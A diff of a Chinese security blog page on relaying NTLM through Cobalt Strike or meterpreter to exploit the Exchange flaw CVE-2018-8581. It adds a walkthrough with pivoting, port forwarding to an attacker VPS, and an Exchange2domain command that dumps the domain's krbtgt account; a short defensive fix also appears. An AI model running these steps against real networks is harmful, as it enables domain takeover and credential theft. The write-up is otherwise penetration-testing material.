@@ -124,7 +124,9 @@
 <meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/15485611318865.jpg">
 <meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/15485612387475.jpg">
 <meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/15485613085983.jpg">
-<meta property="og:updated_time" content="2019-01-27T11:13:05.721Z">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/15486510674349.jpg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/15486518696316.jpg">
+<meta property="og:updated_time" content="2019-01-28T05:07:17.762Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Remote NTLM relaying through CS">
 <meta name="twitter:image" content="https://evi1cg.github.io/usr/uploads/2019/15485575598334.jpg">
@@ -532,10 +534,10 @@
 <blockquote>
 <p>攻击者通过某种方式获取一台域内主机权限。并获取了此主机的域成员账号密码，在获取DC及Exchange Server的ip地址后，利用CVE_2018_8581</p>
 </blockquote>
-<h2 id="0x01-利用思路"><a href="#0x01-利用思路" class="headerlink" title="0x01 利用思路"></a>0x01 利用思路</h2><h3 id="思路一：编译py版的impacket"><a href="#思路一：编译py版的impacket" class="headerlink" title="思路一：编译py版的impacket"></a>思路一：编译py版的impacket</h3><p>在做这个的时候，第一想法就是有没有windows下可用的impacket，后来找了找，还真有<a href="https://github.com/ropnop/impacket_static_binaries" target="_blank" rel="noopener">impacket_static_binaries</a>，于是就拿来用了。但是后来发现是有问题的。<br>首先，利用需要关闭win的445端口，这个就需要重启，这是我们非常不愿意做的，另外，似乎win版的<code>ntlmrelayx</code> 和 <code>smbrelayx</code>还不能用。</p>
+<h2 id="0x01-利用思路"><a href="#0x01-利用思路" class="headerlink" title="0x01 利用思路"></a>0x01 利用思路</h2><h3 id="思路一：编译py版的impacket"><a href="#思路一：编译py版的impacket" class="headerlink" title="思路一：编译py版的impacket"></a>思路一：编译py版的impacket</h3><p>在做这个的时候，第一想法就是有没有windows下可用的impacket，后来找了找，还真有<a href="https://github.com/ropnop/impacket_static_binaries" target="_blank" rel="noopener">impacket_static_binaries</a>，于是就拿来用了。但是后来发现是有问题的。<br><del>首先，利用需要关闭win的445端口，这个就需要重启，这是我们非常不愿意做的，另外，似乎</del>win版的<code>ntlmrelayx</code> 和 <code>smbrelayx</code>还不能用。</p>
 <p><img src="/usr/uploads/2019/15485595933128.jpg" alt="-w932"></p>
 <p>所以直接放弃了。</p>
-<h3 id="思路二：通过meterpreter进行NTLM-relaying"><a href="#思路二：通过meterpreter进行NTLM-relaying" class="headerlink" title="思路二：通过meterpreter进行NTLM relaying"></a>思路二：通过meterpreter进行NTLM relaying</h3><p>这个思路是之前看到的<a href="https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/" target="_blank" rel="noopener">《Remote NTLM relaying through meterpreter on Windows port 445》</a>来的。在这篇文章里面，详细分析了是谁占用了445，如何进行转发再进行Remote NTLM relaying。利用<code>CVE_2018_8581</code>，我们需要两个端口，<code>445</code>和<code>80</code>(80可以是其他端口，用来开启HTTP服务)，但是实际测试的时候，并不顺利，成功添加路由，开启端口转发，开启 socks4a 之后，本地通过proxychains开启一个web server，在内网其他主机请求这个server的时候，并未看到任何请求（可能是姿势不对，成功的师傅还望不吝赐教）。所以通过此方式，也并没达到我期望的效果。</p>
+<h3 id="思路二：通过meterpreter进行NTLM-relaying"><a href="#思路二：通过meterpreter进行NTLM-relaying" class="headerlink" title="思路二：通过meterpreter进行NTLM relaying"></a>思路二：通过meterpreter进行NTLM relaying</h3><p>这个思路是之前看到的<a href="https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/" target="_blank" rel="noopener">《Remote NTLM relaying through meterpreter on Windows port 445》</a>来的。在这篇文章里面，详细分析了是谁占用了445，如何进行转发再进行Remote NTLM relaying。利用<code>CVE_2018_8581</code>，我们需要<del>两个端口，<code>445</code>和</del><code>80</code>(80可以是其他端口，用来开启HTTP服务)，但是实际测试的时候，并不顺利，成功添加路由，开启端口转发，开启 socks4a 之后，本地通过proxychains开启一个web server，在内网其他主机请求这个server的时候，并未看到任何请求（可能是姿势不对，成功的师傅还望不吝赐教）。所以通过此方式，也并没达到我期望的效果。</p>
 <h3 id="思路三：通过CS部署VPN"><a href="#思路三：通过CS部署VPN" class="headerlink" title="思路三：通过CS部署VPN"></a>思路三：通过CS部署VPN</h3><p>这个也是我觉得最简单的一种方式，在上面两种思路失败之后，就只能期待试用这种方式来进行了，还好，成功啦~</p>
 <p>Cobaltstrike 的covertvpn的介绍，可以看<a href="https://www.cobaltstrike.com/help-covert-vpn" target="_blank" rel="noopener">这里</a>。</p>
 <p>在获取到一个Becon之后,右键连接-&gt;Pivoting-&gt;Deploy VPN</p>
@@ -567,8 +569,28 @@
 <p>修复Exchage权限，可使用 <a href="https://raw.githubusercontent.com/gdedrouas/Exchange-AD-Privesc/master/DomainObject/Fix-DomainObjectDACL.ps1" target="_blank" rel="noopener">Fix-DomainObjectDACL.ps1</a></p>
 <p>具体命令为：</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\Fix-DomainObjectDACL<span class="selector-class">.ps1</span> -Fix</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-进一步测试"><a href="#0x03-进一步测试" class="headerlink" title="0x03 进一步测试"></a>0x03 进一步测试</h2><p>经过进一步测试以及对漏洞的原理再次学习，发现其实我们只需要开启一个web服务即可，所以，可以使用任意端口(在impacket中，HTTPRelayServer默认端口为80，<a href="https://github.com/Ridter/Exchange2domain" target="_blank" rel="noopener">Exchange2domain</a>已支持自定义端口)。</p>
+<p>当然，上述 <strong>思路三</strong> 对smbrelay也是非常好用的一种方式。现在补充一下 <strong>思路二</strong> 的具体利用方法。</p>
+<p>由于我们不需要smb Server，所以也不需要向<a href="https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/" target="_blank" rel="noopener">《Remote NTLM relaying through meterpreter on Windows port 445》</a>中所述对445端口进行转发，我们只需要将web端口转发出来即可。在获取一个meterpreter会话之后，添加路由:<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="keyword">run</span><span class="bash"> post/multi/manage/autoroute</span></span><br></pre></td></tr></table></figure></p>
+<p>之后开启<code>socks4a</code>代理。</p>
+<p><img src="/usr/uploads/2019/15486510674349.jpg" alt="-w1006"></p>
+<p>经过测试，发现msf的<code>portfwd</code>不怎么稳定，所以我选择了使用<a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener"><code>ew</code></a>，当然，也可以使用lcx等其他转发工具。<br>在vps上开启转发：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">☁  lcx  ./ew -s lcx_tran -l <span class="number">8088</span> -f <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -g <span class="number">8044</span></span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>监听本地8088端口，并将数据转发到127.0.0.1的8044端口</p>
+</blockquote>
+<p>然后在我们有权限的主机上执行：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\s</span>anfeng<span class="symbol">\D</span>esktop&gt;ew_for_Win.exe -s lcx_tran -l 8044 -f 103.*.*.* -g 8088</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>监听本地8044端口的数据，并将数据转发到103.<em>.</em>.*的8080端口。<code>需要注意的是，有权限的主机监听端口=vps转发端口=Exchange2domain监听端口</code></p>
+</blockquote>
+<p>之后，在vps上配置proxychains，ubuntu上proxychains的配置文件路径为<code>/etc/proxychains.conf</code>。修改代理配置文件，如下：<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"><span class="meta"># add proxy here ...</span></span><br><span class="line"><span class="meta"># meanwile</span></span><br><span class="line"><span class="meta"># defaults set to "tor"</span></span><br><span class="line">socks4  <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1080</span></span><br></pre></td></tr></table></figure></p>
+<p>之后，我们就可一执行Exchange2domain了：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python Exchange2domain.py -ah proxyip -ap 8044 -u<span class="built_in"> user </span>-p password -d domain -th DCIP ExchangeIP --just-dc-user krbtgt</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>注意监听端口跟上面一致，proxyip为我们有权限的主机的ip地址。</p>
+</blockquote>
+<p>所以，整个攻击过程如下：</p>
+<p><img src="/usr/uploads/2019/15486518696316.jpg" alt="-w1440"></p>
 <p><strong>希望以上对你有帮助。</strong></p>
-<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><ol>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ol>
 <li><a href="https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/" target="_blank" rel="noopener">Remote NTLM relaying through meterpreter on Windows port 445</a></li>
 <li><a href="https://github.com/ropnop/impacket_static_binaries" target="_blank" rel="noopener">impacket_static_binaries</a></li>
 <li><a href="https://www.youtube.com/watch?v=YLwJORPJ5OA" target="_blank" rel="noopener">VPN Pivoting with Cobalt Strike </a></li>
@@ -996,7 +1018,7 @@ show_date_time();
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-为什么写这个？"><span class="nav-number">1.</span> <span class="nav-text">0x00 为什么写这个？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-利用思路"><span class="nav-number">2.</span> <span class="nav-text">0x01 利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#思路一：编译py版的impacket"><span class="nav-number">2.1.</span> <span class="nav-text">思路一：编译py版的impacket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路二：通过meterpreter进行NTLM-relaying"><span class="nav-number">2.2.</span> <span class="nav-text">思路二：通过meterpreter进行NTLM relaying</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路三：通过CS部署VPN"><span class="nav-number">2.3.</span> <span class="nav-text">思路三：通过CS部署VPN</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-如何防御-CVE-2018-8581"><span class="nav-number">3.</span> <span class="nav-text">0x02 如何防御 CVE_2018_8581</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-参考"><span class="nav-number">4.</span> <span class="nav-text">0x03 参考</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-为什么写这个？"><span class="nav-number">1.</span> <span class="nav-text">0x00 为什么写这个？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-利用思路"><span class="nav-number">2.</span> <span class="nav-text">0x01 利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#思路一：编译py版的impacket"><span class="nav-number">2.1.</span> <span class="nav-text">思路一：编译py版的impacket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路二：通过meterpreter进行NTLM-relaying"><span class="nav-number">2.2.</span> <span class="nav-text">思路二：通过meterpreter进行NTLM relaying</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路三：通过CS部署VPN"><span class="nav-number">2.3.</span> <span class="nav-text">思路三：通过CS部署VPN</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-如何防御-CVE-2018-8581"><span class="nav-number">3.</span> <span class="nav-text">0x02 如何防御 CVE_2018_8581</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-进一步测试"><span class="nav-number">4.</span> <span class="nav-text">0x03 进一步测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-参考"><span class="nav-number">5.</span> <span class="nav-text">0x04 参考</span></a></li></ol></div>
             
 
           </div>
